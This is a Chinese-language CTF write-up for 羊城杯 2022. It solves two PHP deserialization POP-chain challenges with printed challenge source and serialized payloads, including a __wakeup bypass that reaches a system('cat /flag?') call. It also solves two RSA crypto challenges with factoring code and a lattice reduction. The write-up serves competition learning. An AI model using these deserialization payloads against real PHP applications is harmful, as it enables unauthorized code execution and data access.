<p>包含文件+蚁剑连接+date提权</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (10).PNG)</p>
<h3 id="step_by_step-v3"><a class="markdownIt-Anchor" href="#step_by_step-v3"></a> step_by_step-v3</h3>
<p>pop链题目，这里应该是要跳到hint那里去绕过include_once包含文件，但是过滤很多，包含不进去，然后就看到<code>($this-&gt;y1)();</code>可以看phpinfo，结果flag直接出来了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$y</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$y1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c1=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b1=<span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$y</span>-&gt;y1=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;cheng&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;c1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;bei&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;b1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;yang&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;y1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;b2&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>![1280X1280 (11)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (11).PNG)</p>
<h3 id="safepop"><a class="markdownIt-Anchor" href="#safepop"></a> Safepop</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=[<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;p=<span class="string">&quot;getFlag&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="variable">$f</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot; Fun func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这个题一看就是需要去调那个<code>getFlag</code>方法，但是这里<code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>看到了过滤说明直接调用肯定是不行的，所以我们是需要通过Fun类的回调函数去调用的，这样就可以绕过过滤。</p>
<p>同时还有个问题就是weakup，看了一眼php版本，php7.3可能是还有绕过，不然这题没法做了。</p>
<p>![1280X1280 (12)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (12).PNG)</p>
<p>然后我们就是需要挖链子，这里还有个小问题就是<code>throw new Exception(&quot;no pop&quot;);</code>会抛出异常，绕过他的方式是要让反序列化的内容有错，这里我一直习惯是用数组去改绕过，但是因为这里最后是要改大小绕weakup的所以不用数组也行。这里<code>$b-&gt;p=&quot;getFlag&quot;;</code>也不需要一定赋值<code>getFlag</code>，只要是随便一个B里面没有的方法就行，这里一开始是直接调的Test，所以赋了这个，懒得改了，这里私有方法记得加%00或者url编码一下。还有要改一下B那里改大一点，改成了3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?pop=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Fun&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00Fun%00func&quot;</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (13).PNG)</p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="easyrsa"><a class="markdownIt-Anchor" href="#easyrsa"></a> EasyRsa</h3>
<p>唔，找到一个素数因子，直接分解n。然后就是常规操作，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file  = <span class="string">&quot;D:\\桌面\\CRYPTO附件\\task\\output.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    A.append(n)</span><br><span class="line">A = A[::-<span class="number">1</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,d,n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A:</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">assert</span> p*q == n</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">    d = inverse(e,phi)</span><br><span class="line">    m = decrypt(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n)==c)</span><br><span class="line">    c = m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>
<h3 id="lrsa"><a class="markdownIt-Anchor" href="#lrsa"></a> <strong>LRSA</strong></h3>
<p>根据</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>58</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>P</mi><mo>+</mo><mi>q</mi><mo>−</mo><mi>t</mi><mo>−</mo><mi>k</mi><mi>Q</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(p-58)*P+q-t - kQ=0
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69841em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p>
<p>构造格子</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>P</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>Q</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}
1 &amp; 0 &amp; P\\ 
0 &amp; 1 &amp; 1\\
0 &amp; 0 &amp; Q
\end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>我们需要的向量(p-58,q-44,k)量级大概在1024bit，那么需要对我们构造的lattice进行放大</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>P</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1017</mn></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>Q</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix} 1 &amp; 0 &amp; 2^{1017}P\\  0 &amp; 1 &amp; 2^{1017}\\ 0 &amp; 0 &amp; 2^{1017}Q \end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>使用LLL算法得到(p-58,q-44,k)，即可分解n。</p>
